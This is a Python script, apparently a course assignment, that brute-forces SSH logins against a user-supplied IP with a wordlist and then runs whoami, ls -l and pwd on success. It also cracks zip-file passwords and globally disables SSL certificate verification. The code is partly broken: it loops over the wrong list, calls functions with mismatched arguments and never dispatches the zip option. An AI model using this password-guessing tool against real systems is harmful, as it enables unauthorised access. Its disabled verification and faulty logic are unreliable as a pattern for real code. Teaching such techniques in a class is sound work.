# Script Name:                  Class 16
# Author:                       Cody Juhl
# Date of latest revision:      1/29/2024
# Purpose:                      Python script that prompts the user for a wordlist and starts a brute force attack

import ssl
import nltk
import paramiko
import os
import time
from nltk.corpus import words
import zipfile

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

# Enter a filepath to word list
def wordlist_path():
    while True:
        filepath = input("Please put the absolute path for your word list\n")
        if os.path.isfile(filepath):
            return filepath
        else:
            print("File not found!\n")



# defining functions

def get_list():
    nltk.download('words')
    word_list = words.words()
    return word_list

def check_word():
    user_input = input("Please Enter a word:\n")
    if user_input in words:
        print(f"{user_input} is in the dictionary list!\n")
    else:
        print(f"{user_input} is not in the current word list!\n")

def load_wordlist():
    wordlist = []
    with open('rockyou.txt', 'r') as file:
        while True:
            line = file.readline()
            if not line:
                break
            line = line.rstrip()
            wordlist.append(line)
            print(wordlist)

def ssh_bruteforce():
    # enter variables needed to start SSH brute force
    host = input("Please enter an IP you would like to attack\n")
    username = input("Please enter a username")
    port = 22

    # Using paramiko to establish SSH connection
    ssh = paramiko.SSHClient()

    # automatically add host key
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # attempt brute force
    try:
        with open(password_list, "r") as password:
            word = [line.strip() for line in password]
            for word in words:
                try:
                    ssh.connect(host, port, username, word)
                    stdin, stdout, stderr = ssh.exec_command("whoami")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("ls -l")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("pwd")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    print("Password found", word)
                    break  # Exit loop if successful login
                except paramiko.AuthenticationException:
                    print("Fail to find password")
    except:
        print("Wordlist not found please enter file path again")

def bruteforce_zipfile(zip_path, password_list):
    with zipfile.ZipFile(zip_path, 'r') as extract:
        for password in open(password_list, 'r'):
            password = password.strip()
            try:
                extract.extractall(pwd=password.encode())
                print(f"The password to the zip file is {password}")
                return True
            except Exception as e:
                continue
    print("Could not find the password in current wordlist, try another one")
    return False

decision = input(f'Please choose a mode\n 1. Offensive\m 2. Defensive\n 3. SSH brute force\n 4. Brute force a zip file')

password_list = wordlist_path()

if decision == "1":
    load_wordlist(password_list)

elif decision == "2":
    list = get_list(password_list)
    check_word(list)
elif decision == "3":
    ssh_bruteforce(password_list)
else:
    print(f"Invalid option")